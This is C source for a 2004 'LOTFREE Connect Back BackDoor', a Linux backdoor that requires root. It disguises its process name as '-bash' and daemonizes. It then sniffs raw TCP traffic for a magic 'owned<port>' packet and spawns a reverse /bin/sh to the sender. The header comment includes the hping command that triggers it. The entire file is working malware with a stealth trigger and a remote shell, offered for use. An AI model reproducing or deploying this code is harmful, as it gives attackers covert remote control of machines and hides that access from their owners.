/*-------------------------------------+
 *    LOTFREE Connect Back BackDoor    |
 *   sirius_black [at] imel [dot] org  |
 *            07 / 11 / 2004           |
 *    http://www.lsdp.net/~lotfree/    |
 *-------------------------------------+
 *   Activate the backdoor with a TCP  |
 * packet that looks like 'owned<port>'|
 * example: hping -c 1 -e owned8082 ip |
 *   will send U a shell on the port   |
 *            8082 of your b0x.        |
 *-------------------------------------*/
 
#include <stdio.h>
#include <netinet/in.h>
#include <netdb.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <signal.h>

#define MAXBUFLEN 100

int main (int argc, char *argv[])
{
  int fd,sockfd;
  struct sockaddr_in saddr;
  int n,pid;
  char buf[MAXBUFLEN];
  struct iphdr *ip_header;
  struct tcphdr *tcp_header;
  char *data;
  int port;
  long dst;

  printf("- LOTFREE Connect Back BackDoor -\n");
  printf("  http://www.lsdp.net/~lotfree/\n\n");
  if(geteuid())
  {
    printf("Need root privileges\n");
    return 1;
  }
  bzero(argv[0],strlen(argv[0]));
  strcpy(argv[0],"-bash");
  
  signal(SIGCHLD,SIG_IGN);
  signal(SIGHUP,SIG_IGN);
  
  pid=fork();
  if(pid>0)
  {
    printf("Backdoor launched in background...\n");
    exit(0);
  }
  if ((fd = socket (PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
  {
    perror ("socket");
    exit (1);
  }

  ip_header = (struct iphdr *) buf;
  tcp_header = (struct tcphdr *) (buf + sizeof (*ip_header));
  data = (char *) (buf + sizeof (*tcp_header) + sizeof (*ip_header));

  while (1)
  {
    n=read(fd,buf,sizeof(buf));
    if (n >= 45)
    {
      if (!strncmp (data, "owned", 5))
      {
	dst=ip_header->saddr;
	if (n == 45)
	  port = 80;
	else
	{
	  port=atoi((char *) (data + 5));
	}
	sockfd=socket(PF_INET,SOCK_STREAM,0);
	saddr.sin_family=PF_INET;
	saddr.sin_addr.s_addr=dst;
	saddr.sin_port=htons(port);
	pid=fork();
	if(pid==0)
	{
	  connect(sockfd,(struct sockaddr*)&saddr,sizeof(struct sockaddr));
	  write(sockfd,"go!\n",4);
	  close(0);close(1);close(2);
	  dup2(sockfd,0);
	  dup2(sockfd,1);
	  dup2(sockfd,2);
	  execl("/bin/sh","/bin/sh",(char*)0);
	  close(sockfd);
	  exit(0);
	}
      }
    }
    bzero(buf,MAXBUFLEN);
  }
  close (fd);
  return 0;
}